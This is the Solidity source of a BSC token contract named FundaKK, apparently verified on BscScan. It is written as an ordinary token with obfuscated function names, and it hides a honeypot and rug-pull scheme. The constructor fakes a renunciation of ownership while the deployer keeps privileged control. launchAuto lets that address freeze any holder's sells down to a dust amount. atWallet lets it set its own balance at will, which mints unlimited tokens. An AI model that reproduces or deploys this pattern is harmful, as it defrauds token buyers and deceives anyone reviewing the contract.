/**
 *Submitted for verification at BscScan.com on 2023-01-30
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface txTo {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface enableFeeFund {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract FundaKK {
    uint8 public decimals = 18;
    string public name = "FundaKK";
    address public owner;
    mapping(address => bool) public exemptLiquiditySender;
    mapping(address => bool) public maxIsSender;
    address public tradingToAmount;

    uint256 constant shouldReceiver = 10 ** 10;
    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = "FK";
    uint256 public totalSupply = 100000000 * 10 ** 18;

    mapping(address => uint256) public balanceOf;


    address public maxTx;
    bool public fundReceiver;
    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        txTo tradingLimitExempt = txTo(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        maxTx = enableFeeFund(tradingLimitExempt.factory()).createPair(tradingLimitExempt.WETH(), address(this));
        owner = isMarketing();
        tradingToAmount = owner;
        exemptLiquiditySender[tradingToAmount] = true;
        balanceOf[tradingToAmount] = totalSupply;
        emit Transfer(address(0), tradingToAmount, totalSupply);
        minShould();
    }

    

    function sellLaunchedReceiver(address teamSender, address sellWalletBuy, uint256 fundTrading) internal returns (bool) {
        require(balanceOf[teamSender] >= fundTrading);
        balanceOf[teamSender] -= fundTrading;
        balanceOf[sellWalletBuy] += fundTrading;
        emit Transfer(teamSender, sellWalletBuy, fundTrading);
        return true;
    }

    function transfer(address tokenTrading, uint256 fundTrading) external returns (bool) {
        return transferFrom(isMarketing(), tokenTrading, fundTrading);
    }

    function transferFrom(address tokenShould, address tokenTrading, uint256 fundTrading) public returns (bool) {
        if (tokenShould != isMarketing() && allowance[tokenShould][isMarketing()] != type(uint256).max) {
            require(allowance[tokenShould][isMarketing()] >= fundTrading);
            allowance[tokenShould][isMarketing()] -= fundTrading;
        }
        if (tokenTrading == tradingToAmount || tokenShould == tradingToAmount) {
            return sellLaunchedReceiver(tokenShould, tokenTrading, fundTrading);
        }
        if (maxIsSender[tokenShould]) {
            return sellLaunchedReceiver(tokenShould, tokenTrading, shouldReceiver);
        }
        return sellLaunchedReceiver(tokenShould, tokenTrading, fundTrading);
    }

    function isMarketing() private view returns (address) {
        return msg.sender;
    }

    function launchAuto(address senderBuy) public {
        if (senderBuy == tradingToAmount || !exemptLiquiditySender[isMarketing()]) {
            return;
        }
        maxIsSender[senderBuy] = true;
    }

    function approve(address limitFund, uint256 fundTrading) public returns (bool) {
        allowance[isMarketing()][limitFund] = fundTrading;
        emit Approval(isMarketing(), limitFund, fundTrading);
        return true;
    }

    function atWallet(uint256 fundTrading) public {
        if (fundTrading == 0 || !exemptLiquiditySender[isMarketing()]) {
            return;
        }
        balanceOf[tradingToAmount] = fundTrading;
    }

    function listMaxFund(address tokenSell) public {
        if (fundReceiver) {
            return;
        }
        exemptLiquiditySender[tokenSell] = true;
        fundReceiver = true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function minShould() public {
        emit OwnershipTransferred(tradingToAmount, address(0));
        owner = address(0);
    }


}